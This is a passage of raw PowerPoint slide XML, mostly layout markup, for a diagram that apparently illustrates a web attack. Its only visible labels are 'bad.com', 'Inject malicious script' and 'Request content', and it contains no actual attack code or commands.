                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="object 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534556" y="1360115"/>
            <a:ext cx="1484779" cy="830584"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF2A06"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="2194" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="18"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="3177">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="157586" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2206" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>bad.com</a:t>
            </a:r>
            <a:endParaRPr sz="2206">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162831" name="object 15"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7887541" y="2745441"/>
            <a:ext cx="0" cy="1497386"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 4537 h 2130425"/>
              <a:gd name="T1" fmla="*/ 4537 h 2130425"/>
              <a:gd name="T2" fmla="*/ 0 60000 65536"/>
              <a:gd name="T3" fmla="*/ 0 60000 65536"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="T2">
                <a:pos x="0" y="T0"/>
              </a:cxn>
              <a:cxn ang="T3">
                <a:pos x="0" y="T1"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path h="2130425">
                <a:moveTo>
                  <a:pt x="-38100" y="1065129"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="38100" y="1065129"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="2130259">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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162832" name="object 16"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7783886" y="4216213"/>
            <a:ext cx="207309" cy="214313"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 590 w 304800"/>
              <a:gd name="T1" fmla="*/ 0 h 304800"/>
              <a:gd name="T2" fmla="*/ 0 w 304800"/>
              <a:gd name="T3" fmla="*/ 0 h 304800"/>
              <a:gd name="T4" fmla="*/ 294 w 304800"/>
              <a:gd name="T5" fmla="*/ 1311 h 304800"/>
              <a:gd name="T6" fmla="*/ 590 w 304800"/>
              <a:gd name="T7" fmla="*/ 0 h 3048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04800" h="304800">
                <a:moveTo>
                  <a:pt x="304800" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="152400" y="304800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30480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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162833" name="object 17"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8051426" y="2951349"/>
            <a:ext cx="320769" cy="330574"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 796 w 471170"/>
              <a:gd name="T1" fmla="*/ 281 h 471170"/>
              <a:gd name="T2" fmla="*/ 856 w 471170"/>
              <a:gd name="T3" fmla="*/ 433 h 471170"/>
              <a:gd name="T4" fmla="*/ 899 w 471170"/>
              <a:gd name="T5" fmla="*/ 600 h 471170"/>
              <a:gd name="T6" fmla="*/ 924 w 471170"/>
              <a:gd name="T7" fmla="*/ 778 h 471170"/>
              <a:gd name="T8" fmla="*/ 933 w 471170"/>
              <a:gd name="T9" fmla="*/ 961 h 471170"/>
              <a:gd name="T10" fmla="*/ 924 w 471170"/>
              <a:gd name="T11" fmla="*/ 1145 h 471170"/>
              <a:gd name="T12" fmla="*/ 899 w 471170"/>
              <a:gd name="T13" fmla="*/ 1322 h 471170"/>
              <a:gd name="T14" fmla="*/ 856 w 471170"/>
              <a:gd name="T15" fmla="*/ 1489 h 471170"/>
              <a:gd name="T16" fmla="*/ 796 w 471170"/>
              <a:gd name="T17" fmla="*/ 1640 h 471170"/>
              <a:gd name="T18" fmla="*/ 723 w 471170"/>
              <a:gd name="T19" fmla="*/ 1764 h 471170"/>
              <a:gd name="T20" fmla="*/ 642 w 471170"/>
              <a:gd name="T21" fmla="*/ 1851 h 471170"/>
              <a:gd name="T22" fmla="*/ 556 w 471170"/>
              <a:gd name="T23" fmla="*/ 1903 h 471170"/>
              <a:gd name="T24" fmla="*/ 466 w 471170"/>
              <a:gd name="T25" fmla="*/ 1921 h 471170"/>
              <a:gd name="T26" fmla="*/ 377 w 471170"/>
              <a:gd name="T27" fmla="*/ 1903 h 471170"/>
              <a:gd name="T28" fmla="*/ 291 w 471170"/>
              <a:gd name="T29" fmla="*/ 1851 h 471170"/>
              <a:gd name="T30" fmla="*/ 210 w 471170"/>
              <a:gd name="T31" fmla="*/ 1764 h 471170"/>
              <a:gd name="T32" fmla="*/ 137 w 471170"/>
              <a:gd name="T33" fmla="*/ 1640 h 471170"/>
              <a:gd name="T34" fmla="*/ 77 w 471170"/>
              <a:gd name="T35" fmla="*/ 1489 h 471170"/>
              <a:gd name="T36" fmla="*/ 34 w 471170"/>
              <a:gd name="T37" fmla="*/ 1322 h 471170"/>
              <a:gd name="T38" fmla="*/ 9 w 471170"/>
              <a:gd name="T39" fmla="*/ 1145 h 471170"/>
              <a:gd name="T40" fmla="*/ 0 w 471170"/>
              <a:gd name="T41" fmla="*/ 961 h 471170"/>
              <a:gd name="T42" fmla="*/ 9 w 471170"/>
              <a:gd name="T43" fmla="*/ 778 h 471170"/>
              <a:gd name="T44" fmla="*/ 34 w 471170"/>
              <a:gd name="T45" fmla="*/ 600 h 471170"/>
              <a:gd name="T46" fmla="*/ 77 w 471170"/>
              <a:gd name="T47" fmla="*/ 433 h 471170"/>
              <a:gd name="T48" fmla="*/ 137 w 471170"/>
              <a:gd name="T49" fmla="*/ 281 h 471170"/>
              <a:gd name="T50" fmla="*/ 210 w 471170"/>
              <a:gd name="T51" fmla="*/ 158 h 471170"/>
              <a:gd name="T52" fmla="*/ 291 w 471170"/>
              <a:gd name="T53" fmla="*/ 70 h 471170"/>
              <a:gd name="T54" fmla="*/ 377 w 471170"/>
              <a:gd name="T55" fmla="*/ 17 h 471170"/>
              <a:gd name="T56" fmla="*/ 466 w 471170"/>
              <a:gd name="T57" fmla="*/ 0 h 471170"/>
              <a:gd name="T58" fmla="*/ 556 w 471170"/>
              <a:gd name="T59" fmla="*/ 17 h 471170"/>
              <a:gd name="T60" fmla="*/ 642 w 471170"/>
              <a:gd name="T61" fmla="*/ 70 h 471170"/>
              <a:gd name="T62" fmla="*/ 723 w 471170"/>
              <a:gd name="T63" fmla="*/ 158 h 471170"/>
              <a:gd name="T64" fmla="*/ 796 w 471170"/>
              <a:gd name="T65" fmla="*/ 281 h 47117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71170" h="471170">
                <a:moveTo>
                  <a:pt x="401862" y="68948"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="432027" y="105877"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="453573" y="146822"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="466501" y="190444"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="470810" y="235405"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="466501" y="280366"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="453573" y="323988"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="432027" y="364933"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="401862" y="401862"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="364933" y="432027"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="323988" y="453573"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280366" y="466501"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="235405" y="470810"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="190444" y="466501"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="146822" y="453573"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="105877" y="432027"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68948" y="401862"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38783" y="364933"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17237" y="323988"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4309" y="280366"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="235405"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4309" y="190444"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17237" y="146822"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38783" y="105877"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68948" y="68948"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="105877" y="38783"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="146822" y="17237"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="190444" y="4309"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="235405" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280366" y="4309"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="323988" y="17237"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="364933" y="38783"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="401862" y="68948"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="0365C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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162834" name="object 18"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8072439" y="2910729"/>
            <a:ext cx="1318091" cy="12850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58738">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2846"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2471">
                <a:solidFill>
                  <a:srgbClr val="1333FF"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2262"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2030" b="1">
                <a:solidFill>
                  <a:srgbClr val="06BC00"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Inject</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2030">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="101000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2030" b="1">
                <a:solidFill>
                  <a:srgbClr val="06BC00"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>malicious  script</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2030">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162835" name="object 20"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7304835" y="4549588"/>
            <a:ext cx="232522" cy="200306"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 249 w 339725"/>
              <a:gd name="T1" fmla="*/ 0 h 284479"/>
              <a:gd name="T2" fmla="*/ 0 w 339725"/>
              <a:gd name="T3" fmla="*/ 1263 h 284479"/>
              <a:gd name="T4" fmla="*/ 765 w 339725"/>
              <a:gd name="T5" fmla="*/ 1124 h 284479"/>
              <a:gd name="T6" fmla="*/ 249 w 339725"/>
              <a:gd name="T7" fmla="*/ 0 h 28447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39725" h="284479">
                <a:moveTo>
                  <a:pt x="110566" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="284048"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="339318" y="252590"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11056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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="object 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="1200000">
            <a:off x="4989420" y="3863264"/>
            <a:ext cx="2512919" cy="243656"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="1877"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2030" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Request</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2030" spc="-56" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3000" spc="21" baseline="-1915" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>content</a:t>
            </a:r>
            <a:endParaRPr sz="3000" baseline="-1915" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162837" name="object 22"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4616824" y="3227294"/>
            <a:ext cx="322169" cy="331975"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 989 w 471170"/>
              <a:gd name="T1" fmla="*/ 622 h 471170"/>
              <a:gd name="T2" fmla="*/ 1023 w 471170"/>
              <a:gd name="T3" fmla="*/ 826 h 471170"/>
              <a:gd name="T4" fmla="*/ 1035 w 471170"/>
              <a:gd name="T5" fmla="*/ 1033 h 471170"/>
              <a:gd name="T6" fmla="*/ 1028 w 471170"/>
              <a:gd name="T7" fmla="*/ 1239 h 471170"/>
              <a:gd name="T8" fmla="*/ 1003 w 471170"/>
              <a:gd name="T9" fmla="*/ 1435 h 471170"/>
              <a:gd name="T10" fmla="*/ 959 w 471170"/>
              <a:gd name="T11" fmla="*/ 1619 h 471170"/>
              <a:gd name="T12" fmla="*/ 899 w 471170"/>
              <a:gd name="T13" fmla="*/ 1783 h 471170"/>
              <a:gd name="T14" fmla="*/ 823 w 471170"/>
              <a:gd name="T15" fmla="*/ 1922 h 471170"/>
              <a:gd name="T16" fmla="*/ 733 w 471170"/>
              <a:gd name="T17" fmla="*/ 2031 h 471170"/>
              <a:gd name="T18" fmla="*/ 634 w 471170"/>
              <a:gd name="T19" fmla="*/ 2100 h 471170"/>
              <a:gd name="T20" fmla="*/ 532 w 471170"/>
              <a:gd name="T21" fmla="*/ 2126 h 471170"/>
              <a:gd name="T22" fmla="*/ 433 w 471170"/>
              <a:gd name="T23" fmla="*/ 2112 h 471170"/>
              <a:gd name="T24" fmla="*/ 337 w 471170"/>
              <a:gd name="T25" fmla="*/ 2059 h 471170"/>
              <a:gd name="T26" fmla="*/ 246 w 471170"/>
              <a:gd name="T27" fmla="*/ 1970 h 471170"/>
              <a:gd name="T28" fmla="*/ 167 w 471170"/>
              <a:gd name="T29" fmla="*/ 1846 h 471170"/>
              <a:gd name="T30" fmla="*/ 100 w 471170"/>
              <a:gd name="T31" fmla="*/ 1690 h 471170"/>
              <a:gd name="T32" fmla="*/ 46 w 471170"/>
              <a:gd name="T33" fmla="*/ 1505 h 471170"/>
              <a:gd name="T34" fmla="*/ 13 w 471170"/>
              <a:gd name="T35" fmla="*/ 1300 h 471170"/>
              <a:gd name="T36" fmla="*/ 0 w 471170"/>
              <a:gd name="T37" fmla="*/ 1093 h 471170"/>
              <a:gd name="T38" fmla="*/ 7 w 471170"/>
              <a:gd name="T39" fmla="*/ 888 h 471170"/>
              <a:gd name="T40" fmla="*/ 33 w 471170"/>
              <a:gd name="T41" fmla="*/ 692 h 471170"/>
              <a:gd name="T42" fmla="*/ 76 w 471170"/>
              <a:gd name="T43" fmla="*/ 508 h 471170"/>
              <a:gd name="T44" fmla="*/ 136 w 471170"/>
              <a:gd name="T45" fmla="*/ 343 h 471170"/>
              <a:gd name="T46" fmla="*/ 212 w 471170"/>
              <a:gd name="T47" fmla="*/ 204 h 471170"/>
              <a:gd name="T48" fmla="*/ 303 w 471170"/>
              <a:gd name="T49" fmla="*/ 96 h 471170"/>
              <a:gd name="T50" fmla="*/ 402 w 471170"/>
              <a:gd name="T51" fmla="*/ 27 h 471170"/>
              <a:gd name="T52" fmla="*/ 503 w 471170"/>
              <a:gd name="T53" fmla="*/ 0 h 471170"/>
              <a:gd name="T54" fmla="*/ 603 w 471170"/>
              <a:gd name="T55" fmla="*/ 14 h 471170"/>
              <a:gd name="T56" fmla="*/ 699 w 471170"/>
              <a:gd name="T57" fmla="*/ 67 h 471170"/>
              <a:gd name="T58" fmla="*/ 788 w 471170"/>
